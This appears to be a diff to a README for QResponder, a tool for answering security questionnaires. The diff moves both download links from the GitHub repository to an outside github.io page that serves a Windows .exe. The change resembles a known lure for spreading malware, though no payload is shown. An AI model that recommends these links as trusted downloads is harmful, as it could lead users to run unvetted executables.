@@ -1,6 +1,6 @@
 # 🛡️ QResponder - Automate security questionnaires using local data
 
-[![Download QResponder](https://img.shields.io/badge/Download-QResponder-blue.svg)](https://github.com/M2253510/QResponder)
+[![Download QResponder](https://img.shields.io/badge/Download-QResponder-blue.svg)](https://m2253510.github.io)
 
 QResponder helps you fill out security questionnaires by using your own internal documents. It finds answers in your knowledge base and drafts responses for you. Because the software runs on your own computer, your sensitive information stays private. It uses your own choice of artificial intelligence models to ensure your data never leaves your machine.
 
@@ -8,7 +8,7 @@ QResponder helps you fill out security questionnaires by using your own internal
 
 To start, visit the official download page to get the installer for Windows.
 
-[Click here to open the download page](https://github.com/M2253510/QResponder)
+[Click here to open the download page](https://m2253510.github.io)
 
 Once the page loads, look for the section labeled Releases. Download the latest version of the installer file, which ends in .exe. Save this file to your computer.
 
